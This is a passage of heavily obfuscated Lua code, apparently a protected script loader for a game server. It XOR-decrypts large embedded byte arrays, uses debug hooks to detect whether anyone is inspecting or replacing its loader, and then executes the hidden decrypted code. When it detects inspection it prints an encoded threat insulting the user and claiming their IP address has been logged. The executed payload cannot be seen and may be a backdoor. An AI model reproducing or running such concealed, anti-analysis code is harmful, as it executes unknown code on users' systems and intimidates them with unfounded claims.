  712, 848, 769, 1108, 913, 546, 1198, 1021, 741, 640, 1175, 728, 1087, 821, 610, 807, 971, 981, 686, 803, 1086, 1129,
  1206, 619, 693, 614, 710, 551, 851, 1116, 1138, 832, 776, 922, 1035, 588, 1105, 1192, 721, 1095, 802, 809, 609, 1029,
  824, 900, 863, 638, 842, 907, 576, 839, 941, 948, 915, 601, 792, 636, 646, 1161, 783, 1118, 664, 1106, 788, 747, 1157,
  665, 1027, 1003, 1143, 968, 715, 662, 892, 904, 1066, 653, 853, 621, 1069, 836, 894, 989, 870, 567, 797, 823, 735,
  1059, 1122, 1187, 760, 1173, 1057, 625, 1160, 1210, 1044, 849, 919, 810, 1041, 755, 604, 616, 1137, 748, 590, 695,
  1023, 1178, 833, 1167, 1142, 927, 890, 560, 1098, 761, 1018, 800, 1186, 1197, 988, 1170, 1193, 909, 942, 983, 1165,
  924, 952, 774, 772, 1128, 762, 635, 593, 543, 1030, 705, 624, 864, 548, 667, 1020, 563, 656, 1112, 1091, 1150, 933,
  1082, 852, 752, 861, 1005, 704, 1188, 881, 796, 666, 1010, 1067, 974, 549, 1212, 581, 737, 671, 1074, 872, 817, 857,
  1017, 831, 936, 816, 868, 1031, 1195, 572, 960, 557, 706, 552, 1063, 780, 677, 771, 1113, 559, 1202, 790, 1191, 652,
  1166, 555, 734, 1065, 855, 1201, 689, 558, 746, 618, 738, 786, 1032, 805, 685, 600, 605, 568, 1120, 645, 754, 1054,
  955, 1026, 914, 923, 1060, 921, 856, 719, 612, 1145, 1155, 703, 578, 1154, 980, 579, 1174, 688, 1073, 1121, 901, 1070,
  626, 742, 1126, 1001, 700, 1043, 1022, 606, 1090, 1133, 982, 750, 733, 1053, 644, 1099, 1132, 1056, 663, 585, 889, 845,
  1125, 589, 954, 995, 844, 698, 793, 1208, 1117, 1050, 642, 691, 938, 1076, 804, 1139, 825, 1088, 561, 943, 782, 815,
  1051, 674, 575, 903, 591, 1124, 947, 722, 946, 1055, 620, 1182, 1163, 1123, 827, 1101, 702, 682, 951, 661, 1141, 550,
  996, 834, 743, 876, 1199, 987, 749, 908, 694, 975, 895, 806, 986, 1002, 670, 967, 1013, 945, 639, 961, 764, 699, 847,
  586, 708, 602, 545, 672, 973, 758, 791, 860, 608, 918, 822, 896, 1205, 970, 811, 766, 617, 1111, 740, 1062, 858, 843,
  775, 997, 1008, 1085, 1014, 697, 838, 902, 726, 660, 1130, 1024, 1185, 1107, 584, 929, 871, 1134, 1078, 603, 690, 731,
  1102, 718, 891, 658, 573, 798, 837, 753, 1015, 920, 1033, 1038, 634, 1061, 944, 865, 562, 1052, 669, 964, 1176, 784,
  828, 979, 1207, 934, 911, 701, 879, 678, 883, 937, 949, 1100, 899, 1000, 963, 906, 544, 1004, 976, 1025, 953, 587, 787,
  1162, 756, 680, 992, 1042, 727, 841, 1158, 880, 991, 637, 966, 820, 650, 950, 629, 684, 1114, 917, 1181, 1194, 959,
  1072, 1159, 1190, 732, 1135, 1171, 744, 930, 565, 1183, 939, 597, 611, 1080, 795, 1007, 1039, 1012, 659, 615, 1068,
  1177, 854, 633, 1009, 1179, 1081, 1164, 1046, 1089, 724, 956, 709, 799, 972, 818, 707, 1094, 1071, 1077, 1203, 1131,
  1058, 641, 757, 1049, 564, 1079, 1096, 627, 1034, 1149, 789, 569, 916, -1, 65, 42, 68, 68, 123, 118, 118, 104, 47, 8,
  6, 104, 110, 10, 10, 84, 3, 14, 23, 106, 111, 100, 72, 98, 104, 54, 36, 231, 105, 80, 70, 148, 106, 117, 103, 38, 70,
  7, 119, 222, 132, 83, 92, 115, 86, 2, 31, 93, 81, 210, 90, 213, 102, 107, 19, 84, 5, 31, 11, 104, 98, 78, 7, 110, 71,
  44, 53, 37, 76, 56, 166, 35, 109, 109, 29, 118, 111, 12, 99, 197, 45, 97, 42, 10, 104, 70, 109, 11, 248, 134, 46, 43,
  69, 10, 110, 89, 31, 88, 6, 20, 111, 2, 1, 44, 43, 139, 78, 99, 41, 43, 100, 100, 71, 116, 31, 110, 115, 58, 89, 20,
  56, 55, 3, 112, 83, 40, 30, 88, 105, 78, 12, 21, 84, 120, 22, 32, 10, 38, 86, 35, 150, 104, 2, 115, 35, 11, 20, 88,
  110, 17, 58, 81, 72, 67, 47, 72, 102, 19, 52, 14, 8, 75, 91, 30, 52, 109, 99, 81, 147, 29, 152, 92, 33, 208, 53, 102,
  48, 20, 41, 42, 56, 83, 46, 59, 81, 5, 22, 128, 113, 81, 97, 97, 35, 142, 10, 42, 202, 87, 29, 24, 111, 99, 55, 96, 74,
  69, 106, 37, 148, 125, 115, 22, 100, 16, 7, 121, 108, 110, 74, 111, 225, 70, 226, 28, 106, 122, 0, 142, 28, 75, 42, 73,
  18, 100, 196, 42, 46, 11, 47, 69, 15, 99, 166, 92, 19, 32, 80, 55, 108, 90, 12, 125, 110, 86, 14, 102, 66, 112, 52, 60,
  57, 34, 9, 44, 15, 29, 3, 61, 22, 62, 33, 164, 121, 78, 99, 88, 207, 102, 91, 3, 23, 63, 40, 118, 24, 76, 8, 121, 66,
  68, 93, 78, 166, 20, 99, 9, 108, 7, 91, 70, 110, 78, 2, 207, 99, 109, 5, 12, 83, 126, 18, 1, 57, 38, 55, 86, 228, 21,
  13, 83, 104, 11, 8, 176, 9, 111, 226, 73, 68, 111, 59, 83, 29, 121, 50, 56, 81, 102, 93, 198, 1, 224, 29, 68, 58, 222,
  37, 115, 24, 26, 55, 20, 7, 90, 63, 17, 44, 33, 74, 15, 76, 111, 122, 2, 104, 76, 118, 250, 3, 24, 22, 87, 0, 8, 78, 3,
  7, 104, 53, 18, 35, 109, 87, 35, 80, 197, 83, 66, 151, 193, 73, 34, 85, 68, 104, 14, 63, 10, 18, 107, 71, 108, 97, 4,
  68, 58, 32, 115, 45, 95, 56, 22, 89, 110, 49, 234, 40, 56, 68, 74, 76, 30, 4, 70, 108, 63, 224, 38, 40, 72, 111, 84,
  90, 56, 202, 248, 70, 41, 36, 99, 107, 35, 236, 6, 21, 100, 0, 46, 24, 74, 27, 11, 49, 68, 35, 92, 27, 58, 56, 13, 48,
  45, 120, 104, 70, 59, 61, 90, 7, 99, 87, 119, 109, 90, 34, 97, 7, 97, 66, 26, 100, 29, 80, 37, 102, 74, 38, 118, 121,
  38, 7, 112, 4, 215, 2, 1, 102, 58, 42, 65, 123, 56, 63, 8, 86, 37, 106, 50, 108, 15, 104, 54, 72, 58, 102, 1, 87, 73,
  60, 47, 9, 68, 59, 100, 79, 104, 102, 51, 34, 63, 20, 27, 52, 35, 20, 13, 68, 24, 86, 99, 102, 50, 39, 32, 39, 58, 20,
  72, 123, 50, 126, 25, 24, 73, 206, 105, 27, 59, 58, 87, 52, 29, 113, 87, 66, 30, 134, 57, 35, 127, 8, 68, 122, 86, 15,
  17, 171, 16, 14, 45, 50, 90, 89, 71, 221, 67, 13, 36, 65, 33, 104, 39, 90, 168, 93, 86, 55, 140, 109, 125, 48, 191, 58,
  70, 33, 82, 70, 92, 189, 71, 177, 53, 1, 78, 43, 87, 106, 61, 66, 3, 15, 37, 25, 21, 95, 157, 21, 67, 68, 240, 16, 101,
  50, 1, 8, 80, 100, 2, 42, 52, 29, 3, 104, 103, 20, 93, 179, 76, 77, 25, 95, 55, 28, 126, 106, 58, 108, 21, 60, 18, 110,
  78, 8, 29, 88, 52, 52, 109, 203, 68 }, "bhxQwF8NfFCSMHdnOYL5JlqzdC"); dP7BkuM2XXLQM3KlLCCQTIrXxI3A9cMO0OY0I0ydfMSePaK6ux5R1Syj8Ie4OyR =
wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW; djZDNloc1A1feQjT0zbpZhDZBdWLy2UNJ5Ee9OujK7IoiqbQj6USe99xpk4g8xaUBGQ =
wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW; ymEh5MPalnJ56F55jk5VoiWTylDdfJSayqzsuFEUzcfoP6QbrxONHGs3ZX2fZJ0gn =
djZDNloc1A1feQjT0zbpZhDZBdWLy2UNJ5Ee9OujK7IoiqbQj6USe99xpk4g8xaUBGQ; vJCl8VaDliAYFhzLfLU6Wh8Iz1HIBjW2Ey5dLnnr8GYaSra4K126pBqdMsBIVJlurbFCfg =
ymEh5MPalnJ56F55jk5VoiWTylDdfJSayqzsuFEUzcfoP6QbrxONHGs3ZX2fZJ0gn; f6puyVwnoQF8i1Dg4Kr3uPWcx4R29BYYlHPLWdPE0Su79g6geHPEgVts2AYFVVZ28It7Scuc =
vJCl8VaDliAYFhzLfLU6Wh8Iz1HIBjW2Ey5dLnnr8GYaSra4K126pBqdMsBIVJlurbFCfg; cRglouYelw6oUm18nikemx0yL9DjKBm4OlxDaFHvv9DLRdqySLf =
f6puyVwnoQF8i1Dg4Kr3uPWcx4R29BYYlHPLWdPE0Su79g6geHPEgVts2AYFVVZ28It7Scuc; iFHIYldsHhH8oZ88azAJ3kLz4w0GlndcwHiD6XNvXfaEZGobkDGMmDFeFk3sBi0F2YT =
cRglouYelw6oUm18nikemx0yL9DjKBm4OlxDaFHvv9DLRdqySLf; yEEeChDY3gXxtp5Aid3FdMYL22DDgDPO5iz7Sutiq1kZxop0EBfhIBZqOmrrugim =
iFHIYldsHhH8oZ88azAJ3kLz4w0GlndcwHiD6XNvXfaEZGobkDGMmDFeFk3sBi0F2YT; dNf9QFgFUS1kMS6lACRT7F0tIk4712rHAK5X8k1akCVhAADKTwwqD0W6PbXcMTzyPtA7ejhJheZ =
yEEeChDY3gXxtp5Aid3FdMYL22DDgDPO5iz7Sutiq1kZxop0EBfhIBZqOmrrugim; cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ =
dNf9QFgFUS1kMS6lACRT7F0tIk4712rHAK5X8k1akCVhAADKTwwqD0W6PbXcMTzyPtA7ejhJheZ; vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx = function(
  a)
  K, F = 7970464651344859, 16384 + 1908; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; s0LS09IYO9QhcT1Bbn0MgW0DZEmnGkdVXc6MTBR47LZKP8XMBhFslJvS6dmHc7UEytPBs81 = function(b)
  co = coroutine.create(b)
  wOmMYY83QoIxcQtHQN3Goo61EQO1TcgAz21oii8hAlWBi3BYtMaMi0Atpzyiwsmx6wJXyUYI = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(wOmMYY83QoIxcQtHQN3Goo61EQO1TcgAz21oii8hAlWBi3BYtMaMi0Atpzyiwsmx6wJXyUYI, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return wOmMYY83QoIxcQtHQN3Goo61EQO1TcgAz21oii8hAlWBi3BYtMaMi0Atpzyiwsmx6wJXyUYI
end; mZTVozC794lEh6UlK49KvbwKrOZhn4h45jN2s65mlIF67YwVTee3wIDym2MNfHm = function(f, g)
  phpKJ9oiBJZ5JS2AMx3XyhGbIOROnc1NSWKznqV2gn4kN7zDRN3VbP = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; xPmFULWqAw2etJlbcGQo2OcK1Ovx85dItLuOC8xm6cOio9AJnMl50jvyF78bu = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; mEZXHcdOcsHURXvg4M7xatJbuogfFJ1fwuOmRIM2xCFNR40E0pU6Xj2rIy4x = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      phpKJ9oiBJZ5JS2AMx3XyhGbIOROnc1NSWKznqV2gn4kN7zDRN3VbP(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; qWf1Z3YdVjr70UsuxqUCQoN38WS7GltdFInrtDtsOW0HxQwyFztwIe01IFfFNji3ybO = function(p, n)
    uHcJ1VASfxFF9IKHBZ3vwx1CEst1dqAkZJXDJQjfQEG64AkrmyDn4VAn8k0rupNdsds8 = ""
    for k, q in pairs(p) do uHcJ1VASfxFF9IKHBZ3vwx1CEst1dqAkZJXDJQjfQEG64AkrmyDn4VAn8k0rupNdsds8 =
      uHcJ1VASfxFF9IKHBZ3vwx1CEst1dqAkZJXDJQjfQEG64AkrmyDn4VAn8k0rupNdsds8 ..
      cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ
      [vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('39') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('F2') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('80') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('FF') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('9C') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('8D')]
      [vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('A9') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('46') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('37') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('80')](
      q) end
    ; n(uHcJ1VASfxFF9IKHBZ3vwx1CEst1dqAkZJXDJQjfQEG64AkrmyDn4VAn8k0rupNdsds8)
  end; xPmFULWqAw2etJlbcGQo2OcK1Ovx85dItLuOC8xm6cOio9AJnMl50jvyF78bu(f,
    function(r) mEZXHcdOcsHURXvg4M7xatJbuogfFJ1fwuOmRIM2xCFNR40E0pU6Xj2rIy4x(r, g,
        function(s) qWf1Z3YdVjr70UsuxqUCQoN38WS7GltdFInrtDtsOW0HxQwyFztwIe01IFfFNji3ybO(s,
            function(t) if #s0LS09IYO9QhcT1Bbn0MgW0DZEmnGkdVXc6MTBR47LZKP8XMBhFslJvS6dmHc7UEytPBs81(cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ[vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('2A') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('55') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('37') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('62')]) == 1 then if cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ[vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('2A') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('55') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('37') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('62')] == cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ[vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('0E') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('80') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('FF') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('9C') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('F2')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ[vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('2A') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('55') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('37') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('62')](t) then
                    cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ
                        [vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('2A') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('55') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('37') .. vpT5m6F8kvPwQCesKox7mVFRyI1MguQNiT9smUGwOmn1eev42Wx('62')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; mZTVozC794lEh6UlK49KvbwKrOZhn4h45jN2s65mlIF67YwVTee3wIDym2MNfHm(
{ 593, 802, 700, 806, 1051, 823, 696, 762, 1000, 677, 710, 1031, 996, 894, 1005, 1015, 1021, 1022, 840, 1032, 1171, 839,
  982, 688, 882, 1146, 647, 901, 866, 663, 727, 670, 623, 1013, 964, 903, 662, 832, 1193, 1175, 900, 620, 562, 583, 615,
  918, 791, 713, 919, 750, 1004, 606, 649, 805, 1118, 1207, 1085, 557, 558, 559, 757, 1113, 634, 687, 1122, 645, 974,
  613, 625, 1092, 995, 1204, 1018, 1072, 626, 899, 723, 834, 1080, 660, 650, 971, 957, 853, 841, 550, 1054, 1044, 783,
  784, 1039, 716, 617, 880, 594, 916, 1209, 798, 571, 612, 779, 781, 831, 1149, 968, 917, 891, 598, 928, 547, 844, 966,
  942, 1188, 1046, 717, 1196, 1154, 1028, 838, 852, 718, 564, 871, 807, 744, 1119, 958, 690, 1098, 1033, 1120, 1011,
  1130, 734, 568, 1037, 567, 1078, 764, 695, 954, 906, 1035, 1056, 1082, 544, 603, 1180, 743, 773, 566, 1145, 857, 1166,
  1138, 1201, 698, 592, 934, 1206, 573, 765, 885, 833, 674, 872, 909, 648, 574, 730, 668, 758, 810, 924, 1087, 1017, 969,
  878, 746, 621, 1099, 579, 912, 596, 1162, 1112, 1094, 1203, 988, 959, 742, 732, 1010, 728, 829, 624, 835, 607, 1161,
  990, 983, 1179, 843, 908, 627, 787, 892, 845, 556, 1009, 766, 653, 943, 935, 652, 586, 926, 824, 1116, 549, 864, 979,
  752, 655, 965, 962, 543, 826, 572, 786, 605, 1076, 641, 865, 1135, 676, 1133, 591, 703, 814, 753, 761, 560, 1062, 1132,
  1069, 580, 1187, 602, 1174, 561, 1096, 1107, 777, 939, 1143, 898, 869, 731, 691, 993, 611, 956, 638, 657, 1064, 737,
  721, 1144, 1129, 780, 796, 1163, 886, 1211, 578, 609, 1016, 575, 847, 1047, 711, 1036, 1199, 813, 874, 671, 769, 859,
  1167, 788, 1159, 628, 673, 643, 825, 684, 1097, 1182, 1083, 666, 551, 785, 1164, 1053, 1023, 599, 1148, 1019, 858, 667,
  675, 770, 630, 740, 855, 876, 1186, 922, 1208, 1088, 961, 1073, 812, 1134, 751, 636, 889, 808, 1177, 619, 656, 998,
  651, 1150, 911, 1043, 782, 948, 1002, 951, 563, 1106, 945, 1210, 1109, 797, 1151, 1102, 963, 610, 867, 635, 692, 739,
  745, 902, 877, 1068, 999, 1014, 920, 1198, 803, 686, 748, 794, 760, 860, 1212, 910, 588, 629, 669, 1048, 658, 614, 576,
  771, 1024, 1091, 1142, 582, 672, 887, 817, 1093, 778, 1131, 708, 947, 881, 1114, 1079, 1012, 725, 1105, 704, 938, 683,
  682, 946, 1137, 888, 828, 775, 1049, 1089, 665, 738, 1027, 1038, 890, 883, 997, 972, 1169, 1181, 816, 905, 1170, 952,
  1055, 1157, 685, 755, 1123, 804, 644, 1026, 973, 689, 1008, 1189, 600, 940, 1058, 1077, 975, 1059, 1095, 639, 1160,
  1090, 1184, 1007, 799, 585, 953, 597, 1128, 1117, 897, 772, 862, 927, 1104, 776, 693, 1121, 1136, 736, 941, 854, 555,
  991, 646, 1152, 637, 967, 601, 820, 929, 604, 709, 949, 1197, 986, 622, 741, 907, 1071, 856, 1103, 715, 680, 763, 749,
  930, 1155, 719, 830, 720, 1003, 767, 868, 1173, 1200, 960, 893, 735, 984, 706, 914, 1074, 726, 774, 863, 1030, 849,
  819, 1147, 733, 756, 904, 980, 1101, 565, 608, 1156, 1172, 1040, 1061, 987, 664, 1052, 729, 697, 618, 1006, 873, 633,
  1115, 977, 955, 1141, 1191, 724, 1034, 616, 931, -1, 31, 51, 41, 122, 63, 242, 92, 62, 47, 89, 149, 44, 63, 126, 56,
  10, 39, 80, 101, 97, 73, 112, 125, 121, 108, 50, 222, 164, 36, 46, 108, 70, 9, 108, 101, 40, 67, 30, 28, 90, 41, 56, 0,
  22, 140, 75, 160, 83, 84, 81, 110, 102, 155, 79, 12, 83, 38, 71, 63, 108, 57, 73, 52, 64, 109, 25, 38, 74, 24, 36, 37,
  74, 58, 58, 113, 63, 90, 118, 80, 66, 5, 116, 97, 68, 97, 108, 88, 2, 244, 231, 20, 18, 118, 127, 112, 31, 74, 66, 113,
  160, 86, 74, 2, 92, 13, 20, 68, 12, 67, 107, 2, 201, 97, 116, 58, 19, 200, 53, 108, 23, 29, 61, 82, 35, 75, 103, 85,
  43, 41, 50, 69, 95, 72, 6, 12, 83, 95, 60, 140, 22, 13, 20, 88, 60, 66, 40, 37, 19, 22, 97, 62, 212, 28, 27, 76, 108,
  67, 19, 61, 29, 40, 31, 180, 88, 250, 16, 108, 1, 6, 0, 36, 188, 36, 74, 1, 119, 102, 25, 68, 90, 87, 82, 7, 19, 68, 1,
  108, 107, 76, 89, 25, 17, 108, 38, 33, 118, 106, 80, 19, 95, 1, 66, 120, 119, 81, 86, 116, 42, 63, 118, 41, 206, 85,
  59, 2, 120, 35, 17, 24, 33, 112, 88, 95, 18, 121, 36, 73, 121, 118, 82, 115, 74, 53, 36, 56, 27, 25, 1, 102, 2, 16, 14,
  41, 12, 69, 100, 159, 75, 115, 6, 79, 8, 204, 70, 29, 93, 43, 190, 208, 9, 0, 19, 44, 71, 125, 106, 210, 120, 90, 86,
  73, 28, 68, 21, 17, 207, 46, 17, 11, 201, 54, 85, 85, 38, 195, 55, 89, 87, 25, 75, 71, 30, 113, 23, 31, 34, 46, 120,
  73, 201, 111, 27, 92, 200, 123, 184, 32, 149, 92, 97, 54, 1, 73, 118, 97, 5, 92, 126, 176, 24, 32, 96, 16, 24, 108, 19,
  20, 8, 93, 70, 54, 12, 97, 45, 116, 91, 132, 126, 19, 20, 87, 110, 107, 41, 39, 33, 75, 111, 31, 10, 73, 15, 88, 251,
  10, 35, 106, 108, 54, 90, 27, 44, 17, 19, 74, 79, 86, 70, 87, 107, 13, 85, 221, 102, 62, 82, 12, 20, 190, 108, 121,
  127, 95, 81, 100, 17, 121, 104, 44, 57, 250, 25, 91, 255, 101, 29, 45, 116, 114, 14, 104, 34, 73, 9, 45, 121, 75, 45,
  80, 73, 34, 12, 113, 82, 95, 40, 94, 83, 20, 8, 19, 75, 106, 41, 95, 68, 123, 15, 21, 11, 57, 37, 34, 39, 108, 209,
  108, 6, 90, 22, 66, 75, 10, 85, 95, 116, 143, 105, 3, 198, 48, 242, 55, 97, 93, 104, 67, 35, 230, 2, 68, 87, 61, 48,
  69, 47, 90, 69, 25, 48, 96, 102, 35, 61, 115, 49, 35, 58, 36, 57, 59, 97, 85, 47, 102, 60, 109, 57, 18, 71, 110, 31,
  26, 50, 69, 65, 95, 86, 131, 107, 80, 11, 176, 6, 47, 66, 41, 173, 87, 69, 19, 14, 108, 45, 184, 43, 18, 50, 80, 87,
  142, 6, 79, 169, 182, 104, 71, 214, 108, 119, 6, 66, 122, 26, 12, 29, 17, 20, 17, 63, 42, 200, 67, 3, 86, 29, 48, 86,
  106, 41, 102, 126, 25, 62, 31, 51, 21, 236, 111, 104, 36, 58, 108, 45, 19, 118, 3, 168, 188, 29, 22, 71, 70, 6, 22, 86,
  6, 63, 44, 71, 66, 73, 233, 94, 47, 86, 16, 71, 92, 10, 103, 24, 45, 31, 13, 30, 84, 84, 102, 120, 16, 11, 87, 77, 112,
  75, 86, 102, 27, 76, 173, 3, 67, 68, 75, 90, 75, 119, 109, 18, 24, 44, 248, 91, 85, 231, 83, 121, 116, 121, 91, 110,
  74, 91, 120, 60, 102, 112, 86, 74, 77, 70, 135, 69, 60, 88, 120, 95, 99, 106, 57, 110, 237, 65, 88, 86, 89, 85, 86, 69,
  90, 30, 60, 22, 86, 3, 120, 56, 48, 78 }, "dYv51YiLkxub3jLVAJXzTHcFw9"); dmuxmb9CgNZt6fXjC3fVOIf7E2stjN9iQLrLQ1RffAraRhUr7ssoLhoOSFm8 =
cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ; oiXQU5lAEDAz7kDvbVxoxhY172zrQbv3LLqQtwjpfc7HkOKLhjr9bfcAz7abGZRvgD =
cZhu0euWlRaHAAB9630q0MliJmfPUrG0HvzWs2HFreHu7IFpxTIlKqrQ; lh8n06PDLpYse1sWmKJlOyObunS5kiTafbBYPRPURnZPs2W5TD9SIrIq4rLL88A3oaK6 =
oiXQU5lAEDAz7kDvbVxoxhY172zrQbv3LLqQtwjpfc7HkOKLhjr9bfcAz7abGZRvgD; yAyq2iZ2FTtYA91qZwJG5gvMRPGJ2rtcoJ2R0j9G74YOUSiERtZ1QQDXpVgCFTav =
lh8n06PDLpYse1sWmKJlOyObunS5kiTafbBYPRPURnZPs2W5TD9SIrIq4rLL88A3oaK6; vZVp7HPaTthxcMy9ScBUxVtB11GUbnsSePfMIg9AEtUXxSqHDWIK1O5LtszaHeGn0J =
yAyq2iZ2FTtYA91qZwJG5gvMRPGJ2rtcoJ2R0j9G74YOUSiERtZ1QQDXpVgCFTav; wVZIKLo5CYBHkqNfmtKYAub8Pj4vwb77nhqfKrQGh84e5jGITHG5fQp6uHokQG1x54Q4sVid =
